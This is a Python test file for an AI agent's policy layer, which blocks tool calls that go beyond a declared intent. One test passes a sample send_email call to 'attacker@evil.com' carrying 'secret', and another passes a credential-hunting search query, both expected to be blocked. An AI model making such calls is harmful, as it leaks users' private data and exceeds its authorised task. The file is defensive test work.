from agent.intent_schema import DeclaredIntent
from agent.policy_layer import check_tool_call


def test_blocks_send_to_attacker():
    intent = DeclaredIntent(
        task="Read latest emails only",
        allowed_tools=["read_emails"],
        max_emails=3
    )

    decision = check_tool_call(
        intent,
        "send_email",
        {"to": "attacker@evil.com", "subject": "test", "body": "secret"}
    )

    assert decision.allowed is False


def test_allows_declared_read():
    intent = DeclaredIntent(
        task="Read latest emails",
        allowed_tools=["read_emails"],
        max_emails=5
    )

    decision = check_tool_call(intent, "read_emails", {"max_results": 3})

    assert decision.allowed is True


def test_blocks_too_many_emails():
    intent = DeclaredIntent(
        task="Read only 3 recent emails",
        allowed_tools=["read_emails"],
        max_emails=3
    )

    decision = check_tool_call(intent, "read_emails", {"max_results": 10})

    assert decision.allowed is False


def test_allows_expected_recipient():
    intent = DeclaredIntent(
        task="Send email to class partner",
        allowed_tools=["send_email"],
        allowed_recipients=["sahiti@example.com"]
    )

    decision = check_tool_call(
        intent,
        "send_email",
        {"to": "sahiti@example.com", "subject": "Update", "body": "Done"}
    )

    assert decision.allowed is True


def test_blocks_unapproved_search_query():
    intent = DeclaredIntent(
        task="Search only class project emails",
        allowed_tools=["search_emails"],
        allowed_queries=["project"]
    )

    decision = check_tool_call(
        intent,
        "search_emails",
        {"query": "password OR confidential"}
    )

    assert decision.allowed is False